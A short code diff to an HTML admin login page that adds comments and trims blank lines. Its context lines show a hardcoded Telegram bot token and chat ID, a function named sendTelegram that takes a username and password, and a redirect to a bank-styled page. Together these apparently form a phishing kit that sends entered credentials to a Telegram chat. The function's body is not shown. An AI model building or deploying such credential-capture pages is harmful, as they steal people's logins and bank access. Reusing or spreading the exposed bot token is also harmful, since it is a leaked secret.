@@ -3,7 +3,6 @@
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>KAVIYA ADMIN</title>
-
 <style>
 body{
 margin:0;
@@ -166,6 +165,7 @@ font-weight:bold;
 let loggedIn = false;
 let isLogging = false;
 
+// Telegram bot placeholders
 let botToken = "8439501847:AAGx25aJnenO2iPwXfSaXqbtZjfW49AXf5o";
 let chatId = "8324590734";
 
@@ -211,7 +211,6 @@ btn.innerText = "LOGIN";
 btn.disabled = false;
 isLogging = false;
 },2000);
-
 }
 
 function sendTelegram(username, password){
@@ -244,7 +243,7 @@ if(!loggedIn){
 alert("⚠️ Please first login");
 return;
 }
-location.href="ez-bank.html";
+location.href="ez-bank.html"; // make sure this file exists in same folder
 }
 
 function contactAdmin(){
